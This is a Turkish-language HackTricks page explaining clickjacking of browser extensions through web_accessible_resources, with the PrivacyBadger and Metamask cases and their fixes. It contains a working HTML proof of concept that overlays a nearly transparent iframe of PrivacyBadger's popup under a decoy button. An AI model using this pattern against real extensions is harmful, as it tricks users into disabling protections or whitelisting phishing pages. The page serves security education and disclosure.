# BrowExt - ClickJacking

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmaya öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **💬 [Discord grubumuza](https://discord.gg/hRep4RUj7f) katılın veya [telegram grubumuza](https://t.me/peass) katılın veya bizi Twitter'da** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Temel Bilgiler

Bu sayfa, bir Tarayıcı eklentisindeki ClickJacking zafiyetini kötüye kullanacaktır.\
ClickJacking nedir bilmiyorsanız şuraya bakın:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

Uzantılar **`manifest.json`** dosyasını içerir ve bu JSON dosyasında bir `web_accessible_resources` alanı bulunmaktadır. [Chrome belgelerinde](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) şöyle denir:

> Bu kaynaklar daha sonra **`chrome-extension://[PAKET ID]/[YOL]`** URL'si aracılığıyla bir web sayfasında kullanılabilir, bu URL **`extension.getURL yöntemi`** ile oluşturulabilir. İzin verilen kaynaklar uygun CORS başlıkları ile sunulur, bu nedenle XHR gibi mekanizmalar aracılığıyla erişilebilir.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Tarayıcı uzantısındaki **`web_accessible_resources`**, sadece web aracılığıyla erişilebilir değildir; aynı zamanda uzantının doğal ayrıcalıklarıyla çalışır. Bu, şunları yapabilme yeteneğine sahiptir:

* Uzantının durumunu değiştirebilme
* Ek kaynaklar yükleme
* Tarayıcıyla belirli bir düzeyde etkileşimde bulunma

Ancak, bu özellik bir güvenlik riski oluşturur. Eğer **`web_accessible_resources`** içindeki bir kaynak önemli bir işlevselliğe sahipse, bir saldırgan bu kaynağı potansiyel olarak harici bir web sayfasına gömebilir. Bu sayfayı ziyaret eden şüphesiz kullanıcılar, bu gömülü kaynağı yanlışlıkla etkinleştirebilirler. Bu etkinleştirme, uzantının kaynaklarının izinlerine ve yeteneklerine bağlı olarak istenmeyen sonuçlara yol açabilir.

## PrivacyBadger Örneği

PrivacyBadger uzantısında, `skin/` dizini, aşağıdaki şekilde `web_accessible_resources` olarak ilan edilen bir zafiyet tespit edildi (Orijinal [blog yazısına](https://blog.lizzie.io/clickjacking-privacy-badger.html) bakın):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Bu yapılandırma potansiyel bir güvenlik sorununa yol açtı. Özellikle tarayıcıda GizlilikKartalı simgesine tıklama sonucu oluşturulan `skin/popup.html` dosyası, bir `iframe` içine yerleştirilebilirdi. Bu yerleştirme, kullanıcıları yanıltmak ve yanlışlıkla "Bu Web Sitesi İçin GizlilikKartalı'yı Devre Dışı Bırak" seçeneğine tıklamalarını sağlamak için sömürülebilirdi. Bu eylem, GizlilikKartalı korumasını devre dışı bırakarak kullanıcının gizliliğini tehlikeye atabilir ve kullanıcıyı artan takibe maruz bırakabilir. Bu saldırının görsel bir gösterimi, [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm) adresinde sağlanan ClickJacking video örneğinde görülebilir.

Bu zafiyeti ele almak için basit bir çözüm uygulandı: `web_accessible_resources` listesinden `/skin/*`'nin kaldırılması. Bu değişiklik, `skin/` dizininin web erişilebilir kaynaklar aracılığıyla erişilemeyeceğini veya manipüle edilemeyeceğini sağlayarak riski etkili bir şekilde azalttı.

Düzeltme kolaydı: **`web_accessible_resources` listesinden `/skin/*`'yi kaldırın**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask Örneği

[**Metamask'ta bir ClickJacking hakkında bir blog yazısı burada bulunabilir**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). Bu durumda, Metamask, erişim için kullanılan protokolün **`https:`** veya **`http:`** olduğunu kontrol ederek (örneğin **`chrome:`** değil):

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

Metamask uzantısında **başka bir ClickJacking düzeltildi**. Kullanıcılar, sayfanın **“web_accessible_resources”: [“inpage.js”, “phishing.html”]** nedeniyle dolandırıcılık olabileceğini şüpheli bulduğunda **Tıklamayla beyaz listeye eklenebiliyordu**. Bu sayfa Clickjacking'e karşı savunmasız olduğundan, bir saldırgan, kurbanın fark etmeden beyaz listeye eklemesini sağlamak için normal bir şey göstererek bunu istismar edebilir ve ardından beyaz listeye alınacak olan dolandırıcılık sayfasına geri dönebilirdi.

## Steam Envanter Yardımcısı Örneği

Bir tarayıcı uzantısındaki bir **XSS**'nin bir **ClickJacking** zafiyeti ile nasıl birleştirildiğini kontrol etmek için aşağıdaki sayfaya bakın:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## Referanslar

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
